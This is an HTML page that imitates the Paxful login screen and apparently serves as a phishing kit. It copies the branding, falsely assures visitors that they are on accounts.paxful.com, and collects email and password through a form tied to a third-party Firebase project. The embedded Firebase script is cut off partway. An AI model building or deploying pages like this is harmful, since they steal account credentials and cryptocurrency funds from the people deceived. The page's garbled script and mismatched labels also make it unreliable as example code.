<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login with Paxful</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="header">
            <img src="paxful-logo.jpeg" alt="Paxful Logo" class="logo">
            <h2>Log In With Paxful</h2>
        </div>
        <style>
          body {
              font-family: Arial, sans-serif;
              background-color: #f9f9f9;
              margin: 0;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
          }
          .notice {
              background-color: #e7f3ff;
              border-left: 4px solid #007bff;
              padding: 10px 20px;
              max-width: 500px;
              border-radius: 5px;
              box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
          }
          .notice img {
              vertical-align: middle;
          }
          .notice p {
              margin: 10px 0;
              font-size: 16px;
          }
          .notice .url {
              background-color: #fff;
              padding: 5px 10px;
              border: 1px solid #ccc;
              border-radius: 3px;
              display: inline-block;
              font-family: monospace;
          }
          .notice .url img {
              vertical-align: middle;
              margin-right: 5px;
          }
      </style>
        <div class="notice">
          <p><img src="https://img.icons8.com/ios-filled/50/007bff/info.png" alt="Info" width="20" height="20"> IMPORTANT! Please check that you are visiting https://accounts.paxful.com/<span class="url"><img src="https://img.icons8.com/ios-filled/50/00cc66/lock--v1.png" alt="Lock" width="20" height="20"> https://accounts.paxful.com/</span></p>
      </div><br>

        <form class="login-form" id="registrationForm">
            <label for="phone-email">Your Phone or Email</label>
            <input type="email" id="email" name="phone-email" required>
            
            <label for="password">Your Password</label>
            <input type="password" id="password" name="password" required>
            
            <div class="forgot-password">
              <a href="#">Forgot password?</a>
          </div>

            <button type="submit" class="login-button">Log in</button>
        </form>

        <div class="create-account">
            <p>Already have an account? <a href="#">Log In</a></p>
        </div>
    </div>

          projectId: "qwertyqwe-da842",

          messagingSenderId: "607214606288",
          appId: "1:607214606288:web:ff464cc3b08ac71cd10bd5"
        };
      
        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
      </script>
    <script src="main.js"></script>
</body>
</html>
